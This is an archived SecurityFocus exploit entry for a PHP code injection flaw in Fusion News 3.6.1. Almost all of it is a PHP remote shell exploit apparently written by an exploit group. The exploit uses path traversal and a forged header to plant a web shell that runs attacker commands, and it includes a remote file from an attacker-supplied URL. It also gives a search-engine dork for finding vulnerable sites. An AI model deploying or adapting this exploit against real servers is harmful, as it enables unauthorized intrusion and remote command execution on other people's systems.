source: http://www.securityfocus.com/bid/13661/info

FusionPHP Fusion News is prone to a remote PHP code injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input. This may facilitate unauthorized access. 

<?
$copyr = "
!!! PRIVATE !!! PRIVATE !!! PRIVATE !!! PRIVATE !!! PRIVATE !!!

oooo...oooo.oooooooo8.ooooooooooo
.8888o..88.888........88..888..88
.88.888o88..888oooooo.....888
.88...8888.........888....888
o88o....88.o88oooo888....o888o
********************************
**** Network security team *****
********* nst.void.ru **********
********************************
* Title: Fusion News v3.6.1
* Date: 15.05.2005
********************************

Remote shell exploit.

Google:
allintitle:f u s i o n : n e w s : m a n a g e m e n t : s y s t e m

Script owner: www.fusionphp.net

*** Exploit contains anti-script kidis trick. ***
Count: 4

Greetz to: GHC, RST, LWB, AntiChat, VOID, Web-Hack, Securitylab, Security.nnov, Securityfocus

Visit all our friends:
Rus:
ghc.ru
rst.void.ru
lwb57.org
antichat.ru
void.ru
web-hack.ru
securitylab.ru
security.nnov.ru
Eng:
securityfocus.com

Greentz to Ch0k37 from gh0sts, which wants to purchase this exploit but he was too greedy.

!!! PRIVATE !!! PRIVATE !!! PRIVATE !!! PRIVATE !!! PRIVATE !!!

*** Public: 17.05.2005 ***
";

# CONFIG                     (example: http://www.site.com/news/)
$host   = "www.site.com";       # address - example: www.site.com
$folder = "folder/to/fusion";   # folder - example: news
# END OF CONFIG


$fp = fsockopen($host, 80);
$data = "name=nst&email=&fullnews=nst&chars=297&com_Submit=Submit&pass=";
$out = "POST /$folder/comments.php?mid=post&id=/../../templates/headline_temp HTTP/1.1\r\n";
$out.= "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, */*\r\n";
$out.= "Referer: http://$host/\r\n";
$out.= "Accept-Language: ru\r\n";
$out.= "X-FORWORDEDFOR: <?@include($_GET[nst_inc]);@passthru($_GET[nst_cmd]);?>\r\n";
$out.= "Content-Type: application/x-www-form-urlencoded\r\n";
$out.= "Accept-Encoding: gzip, deflate\r\n";
$out.= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)\r\n";
$out.= "Host: $hots\r\n";
$out.= "Content-Length: 64\r\n";
$out.= "Connection: Keep-Alive\r\n";
$out.= "Cache-Control: no-cache\r\n";
$out.= "\r\n";
$out.= "name=test&email=&fullnews=test&chars=297&com_Submit=Submit&pass=";
fputs($fp,$out);
while(!feof($fp)){
fgets($fp, 128);
}
print "<pre>";
print $copyr;
print "\r\n\r\n <b>
Result:

http://$host/$folder/templates/headline_temp.php?nst_inc=http://YOUR_FILE \r\n";
print "http://$host/$folder/templates/headline_temp.php?nst_cmd=ls -la";
?>

